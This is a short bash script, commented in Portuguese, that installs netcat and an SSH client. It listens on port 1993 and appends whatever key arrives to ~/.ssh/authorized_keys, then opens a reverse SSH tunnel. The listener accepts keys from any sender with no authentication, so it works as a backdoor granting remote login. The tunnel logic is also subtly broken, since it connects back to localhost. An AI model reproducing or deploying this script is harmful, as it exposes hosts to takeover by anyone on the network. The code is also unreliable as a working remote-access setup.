#!/bin/bash

# Instalar o cliente SSH e o netcat
sudo apt-get update
sudo apt-get install -y openssh-client netcat

# Configurar variáveis
porta_reversa=2222
porta_netcat=1993

# Criar função para processar as informações da máquina local
processar_informacoes() {
    read -ra info_array
    usuario_local=${info_array[0]}
    chave_local=${info_array[1]}
    
    # Configurar chave SSH e outros parâmetros
    echo "$chave_local" >> ~/.ssh/authorized_keys
    chmod 600 ~/.ssh/authorized_keys
    echo "IdentityFile ~/.ssh/id_rsa" >> ~/.ssh/config
    
    # Configurar conexão SSH reversa
    ssh -fN -R $porta_reversa:localhost:22 $usuario_local@localhost
    echo "Conexão SSH reversa estabelecida."
}

# Aguardar as informações da máquina local e chamar a função para processá-las
nc -l -p $porta_netcat -q 1 | processar_informacoes